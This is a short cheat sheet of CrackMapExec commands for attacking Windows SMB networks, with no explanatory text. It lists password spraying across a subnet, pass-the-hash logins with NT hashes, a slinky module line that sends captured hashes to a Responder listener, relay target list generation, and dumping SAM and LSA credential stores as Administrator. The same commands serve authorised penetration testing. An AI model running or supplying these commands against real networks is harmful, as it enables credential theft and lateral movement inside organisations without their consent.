crackmapexec

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
crackmapexec smb 10.0.0.0/24 -u username -d domain -p Password
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
crackmapexec smb 10.0.0.0/24 -u username -H hash --local-auth
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
crackmapexec smb <target ip> -u Guest -p “” -M slinky -o server=responder_ip name=some_unique_name
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~
crackmapexec smb <CIDR> --gen-relay-list targets.txt
~~~

~~~
crackmapexec smb targets.txt -u Administrator -H <NT Hash> --local-auth
~~~

~~~
crackmapexec smb targets.txt -u Administrator -H <NT Hash> --local-auth --sam
~~~

~~~
crackmapexec smb targets.txt -u Administrator -H <NT Hash> --local-auth --lsa
~~~

~~~
crackmapexec smb ../scans/nmap-grep-[date]/smb-hosts.txt --gen-relay-list cme_relay.txt | tee cme.out
~~~